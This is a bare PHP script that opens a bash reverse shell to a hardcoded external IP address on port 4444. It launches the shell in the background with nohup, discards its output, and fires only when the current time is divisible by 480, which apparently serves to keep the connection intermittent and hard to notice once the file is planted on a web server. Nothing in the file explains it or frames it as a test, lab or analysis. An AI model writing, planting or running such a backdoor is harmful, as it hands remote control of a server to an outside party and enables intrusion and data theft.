<?php
function reverse_shell() {
    $ip = '188.166.181.70';
    $port = '4444';
    $payload = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";

    shell_exec("nohup $payload > /dev/null 2>&1 &");
}

if (time() % 480 == 0) {
    reverse_shell();
}

?>
